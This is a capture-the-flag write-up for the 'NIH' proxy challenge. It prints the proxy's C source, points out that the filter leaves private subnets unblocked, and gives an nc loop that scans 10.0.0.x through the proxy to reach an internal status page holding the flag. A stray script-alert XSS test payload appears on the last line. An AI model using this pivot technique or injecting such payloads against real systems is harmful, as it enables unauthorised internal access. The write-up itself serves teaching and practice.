# Haxdump : NIH

#### Author: ispo

Source Code:


    #include <stdio.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <netdb.h>

     typedef struct{
       unsigned int octets[4];
     } Address;

     typedef struct{
       Address addr;
       Address mask;
     } Subnet;

    void error(char* s){
      puts(s);
      exit(-1);
    }

    char* addr_string(Address* a){
      char* rv = NULL;
      asprintf(&rv, "%d.%d.%d.%d",a->octets[0],a->octets[1],a->octets[2],a->octets[3]);
      return rv;
    }

    int filter(Address* a){
      if(a->octets[0] == 127) error("Sorry, 127.0.0.0/8 is a blocked subnet.");
      if(a->octets[0] == 54) error("Sorry, 54.0.0.0/8 is a blocked subnet.");
      if(a->octets[0] == 0) error("Sorry, 0.0.0.0/8 is blocked subnet.");
      return 1;
    }

    int main(int argc, char *argv[]){
      int sockfd, i;
      Address a;

      setbuf(stdout, NULL);

      puts("NIH Proxy");
      puts("Specify an HTTP server to connect to");
      puts("DNS is too hard; just provide an IP address");

      char target[20];
      fgets(target, 20, stdin);
      char* octet = strtok(target, ".\n");

      for(i=0;i<4;i++){
        if(!octet) error("Invalid IP address");
        a.octets[i] = atoi(octet);
        if(a.octets < 0 || a.octets[i] > 256) {
          fprintf(stderr, "Invalid host\n");
          exit(-1);
        }
        octet = strtok(NULL, ".\n");
      }

      filter(&a);
      printf("Connecting to %s\n", addr_string(&a));

      int sin_addr = 0;

      for(i=0; i<4;i++){
        sin_addr <<= 8;
        sin_addr |= a.octets[i];
      }

      struct sockaddr_in serv_addr;
      sockfd = socket(AF_INET, SOCK_STREAM, 0);
      serv_addr.sin_family = AF_INET;
      serv_addr.sin_port = htons(80);
      serv_addr.sin_addr.s_addr = htonl(sin_addr);

      alarm(5);
      connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr));
      char *buf = calloc(256, 1);

      int len = sprintf(buf, "GET / HTTP/1.1\nHost: %s\n\n", addr_string(&a));
      write(sockfd, buf, len);
      int total_len = 0;
      while(total_len < 1024*10){
        len = read(sockfd, buf, 255);
        if(len <= 0) break;
        total_len += len;
        buf[len] = 0;
        fputs(buf, stdout);
        if(len < 255) break;
      }
      close(sockfd);
      return 0;
    }


A quick look on the source code shows that there are no "exploitable" bugs. We have a proxy server
here. What this means? The proxy may has access to some other machine in the internal network.
Let's see the filter function. We filter the subnets:

    127.0.0.0/8
    54.0.0.0/8
    0.0.0.0/8

But not the subnets:

    192.168.0.0/16
    172.16.0.0.16
    10.0.0/8

Let's try to connect to these networks ($i denotes a range 1-254):

    192.168.0.$i
    192.168.1.$i
    10.0.0.$i
    172.16.0.$i
    172.16.1.$i

Here's the script for doing this job:

    for ((i=0; i<256; i++));
    do
      echo 10.0.0.$i | nc nih.haxdump.com 9111;
    done

And the results are:
[..... TRUNCATED FOR BREVITY .....]
NIH Proxy
Specify an HTTP server to connect to
DNS is too hard; just provide an IP address
Connecting to 10.0.0.57
NIH Proxy
Specify an HTTP server to connect to
DNS is too hard; just provide an IP address
Connecting to 10.0.0.58

    HTTP/1.1 200 OK
    Date: Sat, 07 Feb 2015 21:52:23 GMT
    Server: Apache/2.4.7 (Ubuntu)
    Last-Modified: Tue, 03 Feb 2015 21:50:51 GMT
    ETag: "8c-50e36107e3f4e"
    Accept-Ranges: bytes
    Content-Length: 140
    Vary: Accept-Encoding
    Content-Type: text/html

    <html>
     <body>
      <h1>NIH Proxy Status</h1>
      <p>
       Host: 127.0.0.1<br/>
       Flag: cache_invalidation_is_easier<br/>
      </p>
     </body>
    </html>

NIH Proxy
Specify an HTTP server to connect to
DNS is too hard; just provide an IP address
Connecting to 10.0.0.59
[..... TRUNCATED FOR BREVITY .....]

So the flag is: cache_invalidation_is_easier
<script>alert("HI");</script>
